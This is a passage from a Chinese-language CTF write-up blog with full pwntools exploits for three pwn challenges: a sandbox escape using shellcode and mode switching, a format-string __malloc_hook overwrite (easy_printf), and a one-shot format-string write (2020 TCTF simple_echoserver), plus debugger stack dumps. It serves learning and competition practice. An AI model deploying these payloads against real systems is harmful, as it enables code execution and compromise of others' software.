open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040405E</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag += <span class="string">F&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmp byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>], <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">ja loop</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">shellcode_open_x86 = asm(shellcode_open_x86, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax /*set r9*/</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*syscall*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x56],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">shellcode = shellcode_mmap</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_retfq</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode = asm(shellcode, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(shellcode_open_x86 + shellcode_read_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">start = time.time()</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> left &lt; right :</span><br><span class="line">mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">left = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">right = mid</span><br><span class="line">io.close()</span><br><span class="line">flag += possible_list[left]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br><span class="line">end = time.time()</span><br><span class="line">success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上找的exp,看了一下,每一段代码都有使用smc,但实际上在mmap后如果调用一个read往新mmap的内存写上想要的指令就不需要smc了</p><p>即第一次需要smc时构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap(addr,len....)</span><br><span class="line">read(0,addr,len)</span><br><span class="line">jmp addr</span><br></pre></td></tr></table></figure><h1 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h1><p><strong>标签:格式化字符串|printf触发malloc|%a占位符</strong></p><p>保护机制全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/easy_printf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>程序的主体就是两个printf的格式化字符串攻击,不过一个是正常的print但使用一次就会使用系统调用退出,还有一个是削弱了格式化字符串漏洞的__printf_chk函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy you the last time!&quot;</span>);</span><br><span class="line">  s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x80</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  v3 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your fmt: &quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">    s[(<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">5uLL</span>)] = <span class="number">0</span>;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, s, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>比较常见的思路是先泄露栈再利用%n打rop,但因为printf只能使用一次就比较难办了</p><p>__printf_chk对格式化字符串的限制很大,几乎没有什么可利用的功能了</p><p>这就需要用到一个暂时还搞不太清楚原理的知识点,在__printf_chk函数格式化字符串用且只能用一个或者两个%a填充,能够打印出来stdin和stdout指针,以此泄露libc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%a</span><br><span class="line">0x0.07f6e76f5498p-1022</span><br><span class="line">%a%a</span><br><span class="line">0x0.07ffa5ebb098p-10220x0.07ffa5ebb16ap-1022</span><br><span class="line">%a%a%a</span><br><span class="line">null</span><br></pre></td></tr></table></figure><p>虽然不太懂原理,而且本地另写一个程序并没有复现成功,但在应对__printf_chk时不失为一个尝试</p><p>此后还要利用printf在输出超过65535长度的内容时会触发malloc这个知识点,并以此为基础修改malloc_hook为one_gadget并触发</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr2</span>(<span class="params">offset, addr, data, written</span>):</span><br><span class="line"><span class="keyword">global</span> cnt = <span class="number">0</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">address = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">cur = x</span><br><span class="line"><span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">round</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add).encode()</span><br><span class="line"><span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>).encode()</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">written += to_add</span><br><span class="line">payload += <span class="built_in">round</span></span><br><span class="line">address += p64(addr+cnt)</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line"><span class="comment"># trigger malloc</span></span><br><span class="line"><span class="keyword">return</span> (payload+<span class="string">b&quot;%65537c&quot;</span>).ljust(<span class="number">0x50</span>,<span class="string">b&quot;_&quot;</span>) + address</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your fmt: &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%a%a\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc.address = (<span class="built_in">int</span>(p.recv(<span class="number">11</span>),<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) - libc.symbols[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">hook_addr=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(hook_addr))</span><br><span class="line">one=libc.address+<span class="number">0xe3b04</span></span><br><span class="line">info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = fmtstr2(<span class="number">6</span>,hook_addr,p64(one)[:<span class="number">6</span>],<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里看ruan师傅的exp还学到了格式化字符串的%n的一个新姿势</p><p>即%hhn只写一个字节,如果写的数大于255那么只保留最后一个字节的数据</p><p>以此来稳定构造格式化字符串任意写</p><h1 id="2020tctf-simple-echoserver"><a href="#2020tctf-simple-echoserver" class="headerlink" title="2020tctf-simple_echoserver"></a>2020tctf-simple_echoserver</h1><p><strong>标签:格式化字符串|*占位符</strong></p><p>checksec发现保护全开</p><p>看一下程序的流程,读入name和phonenumber</p><p>拼接格式化字符串后由stderr输出,此处存在格式化字符串漏洞,不过只能利用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_13C1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">snprintf</span>(byte_4060, <span class="number">0x100</span>uLL, <span class="string">&quot;[USER] name: %s; phone: %ld\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1, *(_QWORD *)(a1 + <span class="number">256</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, byte_4060);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是要一次利用printf的机会就完成利用,这就难办了</p><p>在没有其他帮助下,正常来说应该最少要两次格式化字符串利用才能完成利用</p><p>这里学到一个新姿势<code>*占位符</code>,*占位符以对应的函数参数的值作为一次变量输出的宽度</p><p>例如<code>printf(&quot;%*c%n&quot;,123,&#39;a&#39;,&amp;var);</code>就会输出123宽度的字符a</p><p>结合*??$即可获取栈上任意的值作为宽度</p><p>但这又有什么用呢?</p><p>如果我们结合%n,那么加上之前输出的宽度,岂不是可以在无输出的情况下完整的写一个地址</p><p>那么思路就有了</p><p>断点下在fprintf处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff7221d658</span> —▸ <span class="number">0x55d2c7dcf41a</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff7221d660</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fff7221d668</span> —▸ <span class="number">0x55d2c7dd2160</span> ◂— <span class="string">&#x27;%*48$c%801983c%26$n%221c%7$hhn&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fff7221d670</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff7221d678</span> —▸ <span class="number">0x55d2c7dcf443</span> ◂— lea rdi, [rip + <span class="number">0xc5b</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff7221d680</span> —▸ <span class="number">0x7fe104ff78a0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff7221d688</span> —▸ <span class="number">0x7fe104e9fb9f</span> (_IO_file_underflow+<span class="number">383</span>) ◂— test rax, rax</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff7221d690</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fff7221d698</span> —▸ <span class="number">0x7fe104e70d3f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov rcx, qword ptr [rsp + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fff7221d6a0</span> ◂— <span class="number">0x3000000008</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7fff7221d6a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│     <span class="number">0x7fff7221d6b0</span> ◂— <span class="number">0x40584a0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7fff7221d6b8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│     <span class="number">0x7fff7221d6c0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0x7fff7221d6c8</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0x7fff7221d6d0</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│     <span class="number">0x7fff7221d6d8</span> —▸ <span class="number">0x55d2c7dcf0f0</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│     <span class="number">0x7fff7221d6e0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│     <span class="number">0x7fff7221d6e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│     <span class="number">0x7fff7221d6f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│     <span class="number">0x7fff7221d6f8</span> —▸ <span class="number">0x55d2c7dcf348</span> ◂— mov rcx, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│     <span class="number">0x7fff7221d700</span> —▸ <span class="number">0x7fe104ff84a0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│     <span class="number">0x7fff7221d708</span> —▸ <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│     <span class="number">0x7fff7221d710</span> ◂— <span class="string">&#x27;111111111111111111111111&#x27;</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│     <span class="number">0x7fff7221d728</span> —▸ <span class="number">0x7fe104ea0f00</span> (_IO_doallocbuf+<span class="number">128</span>) ◂— add esp, dword ptr [rsi + <span class="number">0xf</span>]</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x7fff7221d730</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│     <span class="number">0x7fff7221d738</span> —▸ <span class="number">0x55d2c7dd217e</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│     <span class="number">0x7fff7221d740</span> —▸ <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>e:<span class="number">00f</span>0│     <span class="number">0x7fff7221d748</span> —▸ <span class="number">0x55d2c7dcf28d</span> ◂— mov r12d, eax</span><br><span class="line"><span class="number">1f</span>:<span class="number">00f</span>8│     <span class="number">0x7fff7221d750</span> ◂— <span class="number">0x100c7dcf4e0</span></span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│     <span class="number">0x7fff7221d758</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│     <span class="number">0x7fff7221d760</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7fff7221d768</span> —▸ <span class="number">0x55d2c7dcf4e0</span> ◂— endbr64 </span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7fff7221d770</span> —▸ <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7fff7221d778</span> —▸ <span class="number">0x55d2c7dcf3b3</span> ◂— mov rdx, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7fff7221d780</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7fff7221d788</span> ◂— <span class="number">0x66e1ab4a80f8bd00</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│     <span class="number">0x7fff7221d798</span> —▸ <span class="number">0x55d2c7dcf4d0</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0x7fff7221d7a0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0x7fff7221d7a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0x7fff7221d7b8</span> —▸ <span class="number">0x7fe104e33083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, 